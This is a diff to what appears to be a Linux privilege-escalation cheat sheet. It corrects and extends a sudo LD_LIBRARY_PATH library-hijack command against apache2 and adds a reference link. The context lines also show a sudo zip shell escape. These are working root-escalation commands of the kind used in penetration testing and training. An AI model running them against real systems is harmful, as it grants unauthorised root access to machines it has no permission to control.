@@ -231,7 +231,11 @@ void hijack() {
 ```
 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
 
-sudo LD_LIBRARY_PATH=/tmp/sbin/apache2
+sudo LD_LIBRARY_PATH=/tmp /sbin/apache2
+
+# OR 
+
+sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
 ```
 
 ## SUID SGID Binaries
@@ -323,3 +327,4 @@ sudo zip $TF /etc/hosts -T -TT 'sh #'
 
 * [https://gtfobins.github.io/gtfobins/bash/#suid](https://gtfobins.github.io/gtfobins/bash/#suid)
 * [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+* [https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/](https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/)
